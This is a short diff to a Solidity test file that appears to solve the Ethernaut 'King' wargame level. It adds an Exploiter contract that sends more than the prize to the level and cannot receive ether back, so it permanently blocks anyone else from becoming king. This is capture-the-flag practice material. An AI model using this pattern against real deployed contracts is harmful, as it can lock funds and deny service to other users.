@@ -37,7 +37,14 @@ contract TestKing is BaseTest {
         /** CODE YOUR EXPLOIT HERE */
 
         vm.startPrank(player, player);
-
+        new Exploiter{value: level.prize() + 1}(payable(address(level)));
         vm.stopPrank();
+    }
+}
+
+contract Exploiter {
+    constructor(address payable to) public payable {
+        (bool success, ) = address(to).call{value: msg.value}("");
+        require(success, "Failed!!");
     }
 }
